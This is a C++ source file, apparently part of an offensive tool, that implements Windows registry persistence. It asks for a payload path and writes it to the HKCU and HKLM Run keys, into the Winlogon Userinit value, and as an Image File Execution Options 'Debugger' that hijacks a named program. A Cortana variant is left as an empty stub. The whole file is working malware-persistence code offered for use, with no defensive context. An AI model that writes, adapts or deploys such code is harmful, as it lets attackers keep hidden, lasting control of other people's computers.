#include "common.h"
#include "RegistryPersistence.h"

BOOL modify_key_hkcu()
{
	string payloadPath;
	string valueName;

	cout << "Enter the path of payload" << endl;
	cin >> payloadPath;

	cout << "Enter the name of the value" << endl;
	cin >> valueName;

	return modify_key(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", (LPCSTR)valueName.c_str(), (LPCSTR)payloadPath.c_str(), TRUE);
}


BOOL modify_key_hklm()
{
	string payloadPath;
	string valueName;

	cout << "Enter the path of payload" << endl;
	cin >> payloadPath;
	cout << "Enter the name of the value" << endl;
	cin >> valueName;

	return modify_key(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",(LPCSTR)valueName.c_str(),(LPCSTR)payloadPath.c_str(), TRUE, TRUE);
}


BOOL modify_key_userinit()
{
	string payload_path;
	cout << "Enter the path of the payload : " << endl;
	cin >> payload_path;
	payload_path = payload_path + ",C:\\Windows\\System32\\userinit.exe";
	return modify_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", payload_path.c_str(), FALSE);
}


BOOL modify_key_ifeo()
{
	string imageFile;
	cout << "Enter the image file name:" << endl;
	cin >> imageFile;
	string filePath = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + imageFile;

	string payloadPath;
	cout << "Enter payload path name:" << endl;
	cin >> payloadPath;

	modify_key(HKEY_LOCAL_MACHINE,filePath.c_str(), "Debugger", payloadPath.c_str(), TRUE);
	return FALSE;
}

/* To be implemented after check */
BOOL modify_key_cortana()
{
	return FALSE;
}


